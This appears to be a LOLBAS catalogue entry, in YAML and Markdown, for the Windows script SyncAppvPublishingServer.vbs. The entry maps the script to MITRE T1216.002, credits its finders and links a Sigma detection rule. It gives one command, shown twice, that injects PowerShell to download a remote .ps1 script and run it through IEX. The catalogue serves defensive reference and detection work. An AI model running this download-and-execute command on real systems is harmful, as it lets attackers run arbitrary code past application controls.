---
Acknowledgement:
- Handle: '@monoxgas'
  Person: Nick Landers
- Person: Casey Sm
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}')
    | IEX"
  Description: Inject PowerShell script code with the provided arguments
  MitreID: T1216.002
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: PowerShell
  Usecase: Use Powershell host invoked from vbs script
Created: 2018-05-25
Description: Script used related to app-v and publishing server
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml
Full_Path:
- Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
Name: Syncappvpublishingserver.vbs
Resources:
- Link: https://twitter.com/monoxgas/status/895045566090010624
- Link: https://twitter.com/subTee/status/855738126882316288
mitre_data:
  technique_ids:
  - T1216.002
tags:
- lolbas/osscripts
---

# Syncappvpublishingserver.vbs

Script used related to app-v and publishing server

# Path(s)

- `C:\Windows\System32\SyncAppvPublishingServer.vbs`

# Execute Commands

Inject PowerShell script code with the provided arguments

```batch
SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
```

- **Usecase:** Use Powershell host invoked from vbs script
- **Privileges Required:** User
- **MitreID:** `T1216.002`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://twitter.com/monoxgas/status/895045566090010624
- https://twitter.com/subTee/status/855738126882316288
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Nick Landers (@monoxgas)
- Casey Sm